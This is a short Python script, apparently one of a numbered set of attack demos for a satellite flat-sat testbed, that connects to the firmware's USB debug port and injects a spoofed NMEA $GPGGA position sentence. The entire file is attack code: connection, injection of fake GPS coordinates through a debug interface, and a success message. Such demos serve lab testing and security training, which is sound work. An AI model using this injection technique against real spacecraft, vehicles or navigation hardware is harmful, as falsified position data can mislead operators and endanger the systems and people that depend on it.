#!/usr/bin/env python3
"""
Attack 04: Debug GPS-Override & GPS L1 Spoofing (USB Variant)
Sends GPS override NMEA data over USB to flat-sat-fw-interno.
"""
import os
import sys
import time

sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), "../lib")))
from flatsat_usb import FlatSatUSB

def main():
    print("[+] Attack 04: GPS Override Demo (flat-sat-fw-interno USB Variant)")
    usb = FlatSatUSB()
    if not usb.connect():
        print("[X] Failed to connect to FlatSat USB port.")
        sys.exit(1)

    print("[*] Sending spoofed NMEA $GPGGA string over USB debug port...")
    nmea_spoof = b"$GPGGA,123519,4807.038,N,01131.000,E,1,08,0.9,545.4,M,46.9,M,,*47\r\n"
    usb.send_raw(nmea_spoof)
    print("[✓] Spoofed GPS coordinates injected.")
    usb.close()

if __name__ == "__main__":
    main()
